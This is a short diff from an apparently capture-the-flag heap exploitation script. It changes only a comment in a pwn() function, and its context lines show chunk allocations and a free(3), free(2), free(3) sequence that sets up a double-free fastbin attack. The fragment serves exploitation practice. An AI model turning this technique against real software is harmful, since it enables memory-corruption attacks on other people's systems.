@@ -69,7 +69,7 @@ def pwn():
     alloc(0x60, 'D'*10) # chunk 4
     alloc(0x80, 'E'*10) # chunk 5
 
-    # fastbin attack
+    # Abusing double-free bug - fastbin attack
     free(3)
     free(2)
     free(3)
